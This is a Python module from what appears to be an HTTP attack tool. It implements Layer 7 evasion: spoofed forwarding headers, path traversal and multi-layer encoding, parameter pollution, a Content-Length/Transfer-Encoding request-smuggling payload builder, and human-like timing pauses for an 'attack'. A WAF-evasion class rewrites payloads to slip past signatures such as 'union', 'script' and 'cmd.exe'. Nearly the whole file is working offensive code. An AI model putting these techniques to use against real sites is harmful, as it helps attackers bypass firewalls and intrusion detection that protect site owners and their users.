"""
Layer 7 Evasion Techniques
Advanced HTTP/HTTPS evasion and anti-detection methods
"""

import random
import string
import time
import base64
import hashlib
import json
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import quote, unquote, urlparse
from dataclasses import dataclass

from core.utils import CryptoUtils, NetworkUtils
from core.logger import logger


@dataclass
class EvasionConfig:
    """Configuration for evasion techniques"""
    # Header evasion
    randomize_headers: bool = True
    use_rare_headers: bool = True
    header_case_evasion: bool = True
    
    # Request evasion
    path_obfuscation: bool = True
    parameter_pollution: bool = True
    encoding_evasion: bool = True
    
    # Timing evasion
    random_delays: bool = True
    jitter_requests: bool = True
    burst_patterns: bool = False
    
    # Protocol evasion
    http_version_mixing: bool = True
    connection_manipulation: bool = True
    
    # Advanced evasion
    request_smuggling: bool = False
    cache_poisoning: bool = False
    
    # Stealth level (1-5, higher = more evasive)
    stealth_level: int = 3


class HTTPEvasion:
    """HTTP-specific evasion techniques"""
    
    def __init__(self, config: EvasionConfig):
        self.config = config
        
        # Rare but valid HTTP headers
        self.rare_headers = [
            'X-Forwarded-For', 'X-Real-IP', 'X-Originating-IP',
            'X-Remote-IP', 'X-Client-IP', 'X-Cluster-Client-IP',
            'X-Forwarded-Host', 'X-Forwarded-Proto', 'X-Forwarded-Server',
            'X-ProxyUser-Ip', 'X-Original-URL', 'X-Rewrite-URL',
            'X-HTTP-Method-Override', 'X-HTTP-Method', 'X-Method-Override',
            'X-Requested-With', 'X-CSRF-Token', 'X-XSRF-TOKEN',
            'X-Frame-Options', 'X-Content-Type-Options', 'X-XSS-Protection',
            'X-Permitted-Cross-Domain-Policies', 'X-Pingback',
            'X-Robots-Tag', 'X-UA-Compatible', 'X-Powered-By'
        ]
        
        # HTTP methods for method override
        self.http_methods = [
            'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS',
            'TRACE', 'CONNECT', 'PROPFIND', 'PROPPATCH', 'MKCOL',
            'COPY', 'MOVE', 'LOCK', 'UNLOCK'
        ]
        
        # Encoding schemes
        self.encodings = [
            'url', 'double_url', 'unicode', 'hex', 'base64',
            'html_entity', 'mixed_case', 'null_byte'
        ]
    
    def evade_headers(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Apply header evasion techniques"""
        evaded_headers = headers.copy()
        
        # Add rare headers
        if self.config.use_rare_headers:
            evaded_headers.update(self._add_rare_headers())
        
        # Randomize header case
        if self.config.header_case_evasion:
            evaded_headers = self._randomize_header_case(evaded_headers)
        
        # Add header pollution
        if self.config.stealth_level >= 3:
            evaded_headers.update(self._create_header_pollution())
        
        return evaded_headers
    
    def evade_path(self, path: str) -> str:
        """Apply path obfuscation techniques"""
        if not self.config.path_obfuscation:
            return path
        
        evaded_path = path
        
        # Path traversal normalization evasion
        if self.config.stealth_level >= 2:
            evaded_path = self._add_path_traversal(evaded_path)
        
        # Double encoding
        if self.config.stealth_level >= 3:
            evaded_path = self._double_encode_path(evaded_path)
        
        # Unicode normalization evasion
        if self.config.stealth_level >= 4:
            evaded_path = self._unicode_normalize_evasion(evaded_path)
        
        # Case variation
        if random.choice([True, False]):
            evaded_path = self._randomize_path_case(evaded_path)
        
        return evaded_path
    
    def evade_parameters(self, params: Dict[str, str]) -> Dict[str, str]:
        """Apply parameter evasion techniques"""
        if not self.config.parameter_pollution:
            return params
        
        evaded_params = {}
        
        for key, value in params.items():
            # Parameter pollution
            if random.choice([True, False]) and self.config.stealth_level >= 2:
                # Add duplicate parameters with different values
                evaded_params[key] = value
                evaded_params[key + '_'] = self._generate_junk_value()
                evaded_params['_' + key] = self._generate_junk_value()
            else:
                evaded_params[key] = value
            
            # Encoding evasion
            if self.config.encoding_evasion and random.choice([True, False]):
                encoded_key = self._apply_encoding(key)
                encoded_value = self._apply_encoding(value)
                evaded_params[encoded_key] = encoded_value
        
        return evaded_params
    
    def evade_user_agent(self, user_agent: str) -> str:
        """Apply User-Agent evasion"""
        if self.config.stealth_level < 2:
            return user_agent
        
        # Modify User-Agent slightly
        modifications = [
            lambda ua: ua.replace('Chrome', 'Chrome '),
            lambda ua: ua.replace('Safari', 'Safari '),
            lambda ua: ua.replace('Firefox', 'Firefox '),
            lambda ua: ua + ' ',
            lambda ua: ua.replace('Windows NT 10.0', 'Windows NT 10.1'),
            lambda ua: ua.replace('Macintosh', 'Macintosh '),
        ]
        
        modified_ua = user_agent
        for _ in range(random.randint(1, 2)):
            modification = random.choice(modifications)
            try:
                modified_ua = modification(modified_ua)
            except:
                pass
        
        return modified_ua
    
    def create_request_smuggling_payload(self, original_request: str) -> str:
        """Create HTTP request smuggling payload"""
        if not self.config.request_smuggling:
            return original_request
        
        # CL.TE (Content-Length vs Transfer-Encoding) smuggling
        smuggled_request = original_request
        
        # Add conflicting headers
        if 'Content-Length:' in smuggled_request:
            # Add Transfer-Encoding header
            smuggled_request = smuggled_request.replace(
                'Content-Length:', 
                'Transfer-Encoding: chunked\r\nContent-Length:'
            )
        
        return smuggled_request
    
    def _add_rare_headers(self) -> Dict[str, str]:
        """Add rare but valid headers"""
        headers = {}
        
        num_headers = random.randint(1, min(3, len(self.rare_headers)))
        selected_headers = random.sample(self.rare_headers, num_headers)
        
        for header in selected_headers:
            if header.startswith('X-Forwarded') or header.endswith('-IP'):
                headers[header] = self._generate_fake_ip()
            elif 'Method' in header:
                headers[header] = random.choice(self.http_methods)
            elif 'Token' in header:
                headers[header] = self._generate_fake_token()
            else:
                headers[header] = self._generate_junk_value()
        
        return headers
    
    def _randomize_header_case(self, headers: Dict[str, str]) -> Dict[str, str]:
        """Randomize header name case"""
        randomized = {}
        
        for key, value in headers.items():
            # Split by hyphens and randomize case of each part
            parts = key.split('-')
            new_parts = []
            
            for part in parts:
                case_type = random.choice(['upper', 'lower', 'title', 'mixed'])
                
                if case_type == 'upper':
                    new_parts.append(part.upper())
                elif case_type == 'lower':
                    new_parts.append(part.lower())
                elif case_type == 'title':
                    new_parts.append(part.title())
                else:  # mixed
                    mixed_part = ''.join([
                        c.upper() if random.choice([True, False]) else c.lower()
                        for c in part
                    ])
                    new_parts.append(mixed_part)
            
            new_key = '-'.join(new_parts)
            randomized[new_key] = value
        
        return randomized
    
    def _create_header_pollution(self) -> Dict[str, str]:
        """Create header pollution for evasion"""
        pollution = {}
        
        # Add junk headers that might confuse WAFs
        junk_headers = [
            f'X-Custom-{random.randint(1, 999)}',
            f'X-Debug-{random.randint(1, 999)}',
            f'X-Test-{random.randint(1, 999)}',
            f'X-Client-{random.randint(1, 999)}'
        ]
        
        for header in random.sample(junk_headers, random.randint(1, 2)):
            pollution[header] = self._generate_junk_value()
        
        # Add headers with special characters
        if self.config.stealth_level >= 4:
            pollution['X-Special-Chars'] = '!@#$%^&*()_+-=[]{}|;:,.<>?'
            pollution['X-Unicode'] = 'ñáéíóúü'
        
        return pollution
    
    def _add_path_traversal(self, path: str) -> str:
        """Add path traversal sequences for normalization evasion"""
        traversal_sequences = [
            '/./', '//', '/./../', '/.//', '//.//',
            '/%2e/', '/%2e%2e/', '/%252e/', '/%252e%252e/'
        ]
        
        # Insert random traversal sequences
        for _ in range(random.randint(1, 2)):
            sequence = random.choice(traversal_sequences)
            insert_pos = random.randint(0, len(path))
            path = path[:insert_pos] + sequence + path[insert_pos:]
        
        return path
    
    def _double_encode_path(self, path: str) -> str:
        """Apply double URL encoding"""
        # First encoding
        encoded = quote(path, safe='/')
        
        # Second encoding (partial)
        double_encoded = ''
        for char in encoded:
            if char == '%' and random.choice([True, False]):
                double_encoded += '%25'  # Encode the % character
            else:
                double_encoded += char
        
        return double_encoded
    
    def _unicode_normalize_evasion(self, path: str) -> str:
        """Apply Unicode normalization evasion"""
        # Replace some characters with Unicode equivalents
        unicode_replacements = {
            '/': '\u2215',  # Division slash
            '.': '\u002e',  # Full stop
            '-': '\u2010',  # Hyphen
            '_': '\u005f'   # Low line
        }
        
        evaded_path = path
        for original, unicode_char in unicode_replacements.items():
            if original in evaded_path and random.choice([True, False]):
                evaded_path = evaded_path.replace(original, unicode_char, 1)
        
        return evaded_path
    
    def _randomize_path_case(self, path: str) -> str:
        """Randomize path case"""
        randomized = ''
        
        for char in path:
            if char.isalpha() and random.choice([True, False]):
                randomized += char.upper() if char.islower() else char.lower()
            else:
                randomized += char
        
        return randomized
    
    def _apply_encoding(self, text: str) -> str:
        """Apply random encoding to text"""
        encoding = random.choice(self.encodings)
        
        if encoding == 'url':
            return quote(text)
        elif encoding == 'double_url':
            return quote(quote(text))
        elif encoding == 'unicode':
            return text.encode('unicode_escape').decode('ascii')
        elif encoding == 'hex':
            return ''.join([f'%{ord(c):02x}' for c in text])
        elif encoding == 'base64':
            return base64.b64encode(text.encode()).decode()
        elif encoding == 'html_entity':
            return ''.join([f'&#{ord(c)};' for c in text])
        elif encoding == 'mixed_case':
            return ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in text])
        elif encoding == 'null_byte':
            return text + '\x00'
        else:
            return text
    
    def _generate_fake_ip(self) -> str:
        """Generate fake IP address"""
        return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    
    def _generate_fake_token(self) -> str:
        """Generate fake token"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    def _generate_junk_value(self) -> str:
        """Generate junk header value"""
        generators = [
            lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15))),
            lambda: str(random.randint(1, 999999)),
            lambda: f"v{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
            lambda: random.choice(['true', 'false', 'enabled', 'disabled', 'on', 'off']),
            lambda: base64.b64encode(random.randbytes(10)).decode()[:15]
        ]
        
        return random.choice(generators)()


class TimingEvasion:
    """Timing-based evasion techniques"""
    
    def __init__(self, config: EvasionConfig):
        self.config = config
        self.last_request_time = 0
        self.request_count = 0
    
    def get_request_delay(self) -> float:
        """Calculate delay before next request"""
        if not self.config.random_delays:
            return 0
        
        base_delay = 0.1
        
        # Add jitter based on stealth level
        if self.config.jitter_requests:
            jitter_factor = self.config.stealth_level * 0.1
            jitter = random.uniform(-jitter_factor, jitter_factor)
            base_delay += jitter
        
        # Burst pattern simulation
        if self.config.burst_patterns:
            # Simulate human-like burst patterns
            if self.request_count % 10 == 0:
                base_delay += random.uniform(1, 3)  # Longer pause every 10 requests
        
        self.request_count += 1
        self.last_request_time = time.time()
        
        return max(0, base_delay)
    
    def should_pause_attack(self) -> bool:
        """Determine if attack should pause (stealth behavior)"""
        if self.config.stealth_level < 4:
            return False
        
        # Random pauses to simulate human behavior
        if random.randint(1, 100) <= 5:  # 5% chance
            return True
        
        # Pause after many requests
        if self.request_count > 0 and self.request_count % 50 == 0:
            return True
        
        return False
    
    def get_pause_duration(self) -> float:
        """Get duration for stealth pause"""
        base_pause = random.uniform(5, 15)
        stealth_multiplier = self.config.stealth_level * 0.5
        
        return base_pause * stealth_multiplier


class ProtocolEvasion:
    """Protocol-level evasion techniques"""
    
    def __init__(self, config: EvasionConfig):
        self.config = config
        self.http_versions = ['HTTP/1.0', 'HTTP/1.1', 'HTTP/2']
    
    def get_http_version(self) -> str:
        """Get HTTP version for evasion"""
        if not self.config.http_version_mixing:
            return 'HTTP/1.1'
        
        # Weighted selection (HTTP/1.1 most common)
        weights = [0.1, 0.8, 0.1]
        return random.choices(self.http_versions, weights=weights)[0]
    
    def get_connection_header(self) -> str:
        """Get Connection header value"""
        if not self.config.connection_manipulation:
            return 'keep-alive'
        
        options = ['keep-alive', 'close']
        
        # Higher stealth level prefers connection reuse
        if self.config.stealth_level >= 3:
            weights = [0.8, 0.2]
        else:
            weights = [0.5, 0.5]
        
        return random.choices(options, weights=weights)[0]
    
    def should_use_chunked_encoding(self) -> bool:
        """Determine if chunked encoding should be used"""
        if self.config.stealth_level < 3:
            return False
        
        return random.choice([True, False])


class WAFEvasion:
    """Web Application Firewall evasion techniques"""
    
    def __init__(self, config: EvasionConfig):
        self.config = config
        
        # Common WAF signatures to evade
        self.waf_signatures = [
            'select', 'union', 'script', 'alert', 'eval',
            'document', 'window', 'location', 'cookie',
            '../', '..\\', '/etc/', 'cmd.exe', 'powershell'
        ]
    
    def evade_payload(self, payload: str) -> str:
        """Apply WAF evasion to payload"""
        if self.config.stealth_level < 2:
            return payload
        
        evaded = payload
        
        # Case variation
        if random.choice([True, False]):
            evaded = self._randomize_case(evaded)
        
        # Character substitution
        if self.config.stealth_level >= 3:
            evaded = self._substitute_characters(evaded)
        
        # Encoding evasion
        if self.config.stealth_level >= 4:
            evaded = self._apply_encoding_evasion(evaded)
        
        return evaded
    
    def _randomize_case(self, text: str) -> str:
        """Randomize case of text"""
        return ''.join([
            c.upper() if random.choice([True, False]) else c.lower()
            for c in text
        ])
    
    def _substitute_characters(self, text: str) -> str:
        """Substitute characters to evade signatures"""
        substitutions = {
            ' ': ['/**/', '+', '%20', '\t'],
            '=': ['%3d', '&#61;'],
            '<': ['%3c', '&#60;', '&lt;'],
            '>': ['%3e', '&#62;', '&gt;'],
            '"': ['%22', '&#34;', '&quot;'],
            "'": ['%27', '&#39;']
        }
        
        result = text
        for original, replacements in substitutions.items():
            if original in result and random.choice([True, False]):
                replacement = random.choice(replacements)
                result = result.replace(original, replacement, 1)
        
        return result
    
    def _apply_encoding_evasion(self, text: str) -> str:
        """Apply encoding-based evasion"""
        # URL encoding with mixed case hex
        encoded = ''
        for char in text:
            if random.randint(1, 100) <= 30:  # 30% chance to encode
                hex_val = f"{ord(char):02x}"
                if random.choice([True, False]):
                    hex_val = hex_val.upper()
                encoded += f"%{hex_val}"
            else:
                encoded += char
        
        return encoded


class Layer7EvasionManager:
    """Main manager for Layer 7 evasion techniques"""
    
    def __init__(self, config: EvasionConfig = None):
        self.config = config or EvasionConfig()
        
        self.http_evasion = HTTPEvasion(self.config)
        self.timing_evasion = TimingEvasion(self.config)
        self.protocol_evasion = ProtocolEvasion(self.config)
        self.waf_evasion = WAFEvasion(self.config)
    
    def apply_all_evasions(self, request_data: Dict[str, Any]) -> Dict[str, Any]:
        """Apply all evasion techniques to request data"""
        evaded_data = request_data.copy()
        
        # Apply header evasions
        if 'headers' in evaded_data:
            evaded_data['headers'] = self.http_evasion.evade_headers(evaded_data['headers'])
        
        # Apply path evasions
        if 'path' in evaded_data:
            evaded_data['path'] = self.http_evasion.evade_path(evaded_data['path'])
        
        # Apply parameter evasions
        if 'params' in evaded_data:
            evaded_data['params'] = self.http_evasion.evade_parameters(evaded_data['params'])
        
        # Apply User-Agent evasion
        if 'headers' in evaded_data and 'User-Agent' in evaded_data['headers']:
            evaded_data['headers']['User-Agent'] = self.http_evasion.evade_user_agent(
                evaded_data['headers']['User-Agent']
            )
        
        # Apply payload evasions
        if 'payload' in evaded_data:
            evaded_data['payload'] = self.waf_evasion.evade_payload(evaded_data['payload'])
        
        # Apply protocol evasions
        evaded_data['http_version'] = self.protocol_evasion.get_http_version()
        evaded_data['connection'] = self.protocol_evasion.get_connection_header()
        
        # Add timing information
        evaded_data['delay'] = self.timing_evasion.get_request_delay()
        evaded_data['should_pause'] = self.timing_evasion.should_pause_attack()
        
        if evaded_data['should_pause']:
            evaded_data['pause_duration'] = self.timing_evasion.get_pause_duration()
        
        return evaded_data
    
    def get_stealth_level(self) -> int:
        """Get current stealth level"""
        return self.config.stealth_level
    
    def set_stealth_level(self, level: int):
        """Set stealth level (1-5)"""
        self.config.stealth_level = max(1, min(5, level))
        logger.info(f"Stealth level set to {self.config.stealth_level}")
    
    def enable_advanced_evasion(self):
        """Enable advanced evasion techniques"""
        self.config.request_smuggling = True
        self.config.cache_poisoning = True
        self.config.stealth_level = 5
        logger.warning("Advanced evasion techniques enabled - use with caution")
    
    def get_evasion_stats(self) -> Dict[str, Any]:
        """Get evasion statistics"""
        return {
            'stealth_level': self.config.stealth_level,
            'techniques_enabled': {
                'header_randomization': self.config.randomize_headers,
                'path_obfuscation': self.config.path_obfuscation,
                'parameter_pollution': self.config.parameter_pollution,
                'timing_evasion': self.config.random_delays,
                'protocol_evasion': self.config.http_version_mixing,
                'advanced_evasion': self.config.request_smuggling
            },
            'request_count': self.timing_evasion.request_count
        }